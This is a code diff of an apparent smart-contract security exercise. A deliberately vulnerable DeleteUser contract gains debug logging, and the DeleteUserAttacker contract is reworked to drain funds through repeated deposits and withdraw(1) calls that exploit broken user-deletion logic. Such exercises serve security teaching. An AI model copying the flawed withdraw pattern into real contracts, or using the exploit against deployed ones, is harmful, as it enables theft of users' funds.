@@ -1,4 +1,5 @@
 pragma solidity 0.8.15;
+import "hardhat/console.sol";
 
 /**
  * This contract starts with 1 ether.
@@ -24,27 +25,39 @@ contract DeleteUser {
         uint256 amount = user.amount;
 
         user = users[users.length - 1];
+        print();
         users.pop();
 
         msg.sender.call{value: amount}("");
     }
+    function print() public {
+        console.log("----------------------------------");
+        for (uint256 i = 0; i < users.length; i++) {
+            console.log("index: ", i);
+            console.log("user: ", users[i].addr);
+            console.log("amount: ", users[i].amount);
+        }
+        console.log("----------------------------------");
+    }
 }
 
 contract DeleteUserAttacker {
-    DeleteUser user;
+    DeleteUser deleteUser;
 
     constructor(address _user) {
-        user = DeleteUser(_user);
+        deleteUser = DeleteUser(_user);
     }
-    receive() external payable {
-        if (address(user).balance >= 1 ether) {
-            user.withdraw(0);
-        }
-    }
+    receive() external payable {}
 
     function attack() external payable {
-        user.deposit{value: msg.value}();
-        user.withdraw(1);
+        deleteUser.deposit{value: msg.value}();
+        deleteUser.deposit{value: 0}();
+        deleteUser.deposit{value: 0}();
+        deleteUser.print();
+
+        deleteUser.withdraw(1);
+        deleteUser.withdraw(1);
+        deleteUser.print();
     }
 }
 
